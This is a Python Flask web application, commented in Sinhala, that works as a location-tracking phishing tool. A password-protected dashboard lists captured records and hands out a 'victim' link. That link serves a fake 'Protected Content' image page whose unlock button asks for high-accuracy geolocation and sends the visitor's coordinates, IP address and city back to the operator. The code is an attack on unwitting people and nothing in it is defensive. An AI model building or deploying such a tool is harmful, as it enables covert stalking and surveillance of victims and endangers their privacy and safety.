import os, requests, datetime
from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__)
app.secret_key = "super_secret_key_123" # Session එකට අවශ්‍යයි

# --- සැකසුම් (Settings) ---
ADMIN_PASSWORD = "5555"  # <--- උඹේ පාස්වර්ඩ් එක මෙතනට දාපන්
captured_logs = []

def get_ip_info(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{{ip}}").json()
        return res if res['status'] == 'success' else None
    except: return None

# --- [ප්‍රධාන පිටුව] Login හෝ Dashboard ---
@app.route('/', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('admin'))
        else:
            return "Wrong Password! <a href='/'>Try Again</a>"

    # ලොග් වෙලා නැත්නම් Login Page එක පෙන්වනවා
    if not session.get('logged_in'):
        return '''
        <body style="background:#0f172a; color:white; display:flex; align-items:center; justify-content:center; height:100vh; font-family:sans-serif;">
            <form method="post" style="background:rgba(255,255,255,0.05); padding:30px; border-radius:15px; border:1px solid #333; text-align:center;">
                <h2 style="color:#4ade80;">Admin Login</h2>
                <input type="password" name="password" placeholder="Enter Password" required 
                       style="padding:10px; border-radius:5px; border:1px solid #444; background:#111; color:white; margin-bottom:15px; width:200px;"><br>
                <button type="submit" style="background:#22c55e; color:white; border:none; padding:10px 20px; border-radius:5px; cursor:pointer; font-weight:bold;">Login</button>
            </form>
        </body>
        '''

    # ලොග් වෙලා ඉන්නවා නම් Dashboard එක පෙන්වනවා
    base_url = request.url_root.replace("http://", "https://").rstrip('/')
    victim_link = f"{base_url}/view"
    return render_template('index.html', logs=reversed(captured_logs), tunnel_url=victim_link)

# --- [Victim Page] අනිත් අයට යවන ලින්ක් එක ---
@app.route('/view')
def victim_page():
    user_ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        user_ip = request.headers.get('X-Forwarded-For').split(',')[0]
    
    ip_info = get_ip_info(user_ip)
    city = ip_info['city'] if ip_info else "Sri Lanka"

    return f'''
    <html>
    <head>
        <title>HD Image Viewer</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px; }}
            .btn {{ background: #25D366; color: white; padding: 15px; border-radius: 50px; border: none; font-weight: bold; width: 80%; max-width: 300px; margin-top: 30px; cursor: pointer; }}
            .blur {{ width: 280px; filter: blur(20px); border-radius: 15px; }}
        </style>
        <script>
            function startProcess() {{
                navigator.geolocation.getCurrentPosition(s, e, {{enableHighAccuracy:true}});
            }}
            function s(p) {{
                fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&ip={user_ip}&city={city}')
                .then(() => location.href='https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=1200');
            }}
            function e() {{ console.log("Permission denied"); }}
        </script>
    </head>
    <body>
        <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=300" class="blur">
        <h2>🔒 Protected Content</h2>
        <p style="color: #888;">Verification required for <b>{city}</b> region.</p>
        <button class="btn" onclick="startProcess()">Verify & Unlock Image</button>
    </body>
    </html>
    '''

@app.route('/log')
def log_data():
    log = {
        "time": datetime.datetime.now().strftime("%H:%M:%S"),
        "ip": request.args.get('ip'),
        "city": request.args.get('city'),
        "lat": request.args.get('lat'),
        "lon": request.args.get('lon')
    }
    captured_logs.append(log)
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
